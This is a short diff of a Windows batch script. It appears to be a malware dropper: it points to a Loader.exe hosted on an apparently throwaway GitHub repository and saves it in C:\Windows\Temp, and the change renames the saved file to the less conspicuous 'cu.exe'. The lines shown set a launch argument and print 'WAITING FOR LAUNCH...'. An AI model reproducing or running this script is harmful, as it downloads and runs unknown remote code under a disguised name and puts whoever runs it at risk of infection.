@@ -1,6 +1,6 @@
 @echo off
 set "url=https://github.com/dexterggsamp12/929228282/raw/refs/heads/main/Loader.exe"
-set "destination=C:\Windows\Temp\Loader.exe"
+set "destination=C:\Windows\Temp\cu.exe"
 set "arguments=Apply"
 
 echo WAITING FOR LAUNCH...
